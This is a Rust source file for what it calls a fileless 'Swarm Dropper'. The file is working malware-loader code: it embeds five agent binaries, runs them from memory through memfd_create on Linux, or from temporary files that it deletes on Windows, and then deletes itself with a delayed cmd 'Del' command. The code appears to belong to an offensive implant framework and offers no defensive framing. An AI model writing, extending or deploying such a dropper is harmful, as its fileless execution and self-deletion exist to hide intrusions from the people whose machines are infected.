use std::env;
#[cfg(target_os = "windows")]
use std::process::Command;
use std::thread;
use std::time::Duration;
use tracing::{info, warn};

// Agent binaries embedded at compile time.
//
// `have_bins` / `have_bins_win` are emitted by build.rs only when every agent
// binary is already present under target/, so a clean clone compiles even
// before `cargo build --release` has produced the payloads (with empty
// embeds and a runtime warning instead of a hard compile error).
#[cfg(all(target_os = "windows", have_bins_win))]
mod embedded {
    pub const WORKER: &[u8] =
        include_bytes!("../../target/x86_64-pc-windows-gnu/release/worker.exe");
    pub const DRONE: &[u8] = include_bytes!("../../target/x86_64-pc-windows-gnu/release/drone.exe");
    pub const HONEYBEE: &[u8] =
        include_bytes!("../../target/x86_64-pc-windows-gnu/release/honeybee.exe");
    pub const WEAVER: &[u8] =
        include_bytes!("../../target/x86_64-pc-windows-gnu/release/weaver.exe");
    pub const QUEEN: &[u8] = include_bytes!("../../target/x86_64-pc-windows-gnu/release/queen.exe");
}
#[cfg(all(target_os = "windows", not(have_bins_win)))]
mod embedded {
    pub const WORKER: &[u8] = &[];
    pub const DRONE: &[u8] = &[];
    pub const HONEYBEE: &[u8] = &[];
    pub const WEAVER: &[u8] = &[];
    pub const QUEEN: &[u8] = &[];
}
#[cfg(all(not(target_os = "windows"), have_bins))]
mod bins {
    pub const WORKER: &[u8] = include_bytes!("../../target/release/worker");
    pub const DRONE: &[u8] = include_bytes!("../../target/release/drone");
    pub const HONEYBEE: &[u8] = include_bytes!("../../target/release/honeybee");
    pub const WEAVER: &[u8] = include_bytes!("../../target/release/weaver");
    pub const QUEEN: &[u8] = include_bytes!("../../target/release/queen");
}
#[cfg(all(not(target_os = "windows"), not(have_bins)))]
mod bins {
    pub const WORKER: &[u8] = &[];
    pub const DRONE: &[u8] = &[];
    pub const HONEYBEE: &[u8] = &[];
    pub const WEAVER: &[u8] = &[];
    pub const QUEEN: &[u8] = &[];
}

fn main() {
    hive_base::utils::init_logging("dropper");
    info!("Swarm Dropper v0.3.0 - Fileless Edition");
    info!("Agents execute from memory via memfd_create - zero disk footprint");

    // Generate a random arena name for shared memory IPC
    let arena_name = hive_base::shared_arena::generate_arena_name();
    info!("Arena: {}", arena_name);

    #[cfg(target_os = "linux")]
    {
        fileless_spawn("worker", bins::WORKER, &arena_name);
        thread::sleep(Duration::from_secs(2));
        fileless_spawn("drone", bins::DRONE, &arena_name);
        fileless_spawn("honeybee", bins::HONEYBEE, &arena_name);
        fileless_spawn("weaver", bins::WEAVER, &arena_name);
        fileless_spawn("queen", bins::QUEEN, &arena_name);
    }

    #[cfg(target_os = "windows")]
    {
        let temp_dir = env::temp_dir().join(format!("swarm_{}", hive_base::utils::timestamp_now()));
        let _ = std::fs::create_dir_all(&temp_dir);

        let mut launch = |name: &str, data: &[u8]| {
            if data.is_empty() {
                warn!(
                    "Skipping {}: binary not embedded (build agents first)",
                    name
                );
                return None;
            }
            let path = temp_dir.join(format!("{}.exe", name));
            std::fs::write(&path, data).expect("write");
            let child = Command::new(&path)
                .env("__HIVE_ARENA", &arena_name)
                .spawn()
                .expect("spawn");
            let _ = std::fs::remove_file(&path);
            Some(child)
        };

        let _s = launch("worker", embedded::WORKER);
        thread::sleep(Duration::from_secs(2));
        let _sh = launch("drone", embedded::DRONE);
        let _h = launch("honeybee", embedded::HONEYBEE);
        let _w = launch("weaver", embedded::WEAVER);
        let _o = launch("queen", embedded::QUEEN);
    }

    info!("Deployment complete. Swarm active via shared-memory IPC.");

    // Self-destruct
    let current_exe = env::current_exe().unwrap();
    info!("Self-destructing: {:?}", current_exe);

    #[cfg(target_os = "windows")]
    {
        let _ = Command::new("cmd")
            .args(&[
                "/C",
                "choice",
                "/C",
                "Y",
                "/N",
                "/D",
                "Y",
                "/T",
                "2",
                "&",
                "Del",
                current_exe.to_str().unwrap(),
            ])
            .spawn();
    }
    #[cfg(target_os = "linux")]
    {
        let _ = std::fs::remove_file(&current_exe);
    }
}

#[cfg(target_os = "linux")]
fn fileless_spawn(name: &str, data: &[u8], arena_name: &str) {
    if data.is_empty() {
        warn!(
            "Skipping fileless spawn of {}: binary not embedded. \
             Build the agents first with: cargo build --release -p worker -p drone -p honeybee -p weaver -p queen",
            name
        );
        return;
    }
    let memfd_name = format!("swarm_{}", name);
    match hive_base::MemfdBinary::new(&memfd_name, data) {
        Ok(memfd) => {
            let _ = memfd.seal();
            let envs = vec![("__HIVE_ARENA", arena_name)];
            match memfd.spawn(&envs) {
                Ok(child) => {
                    info!(
                        "Fileless spawn: {} (PID: {}, fd: {})",
                        name,
                        child.id(),
                        memfd.raw_fd()
                    );
                }
                Err(e) => {
                    warn!("Failed to spawn {} from memfd: {}", name, e);
                }
            }
        }
        Err(e) => {
            warn!("memfd_create failed for {}: {}", name, e);
        }
    }
}
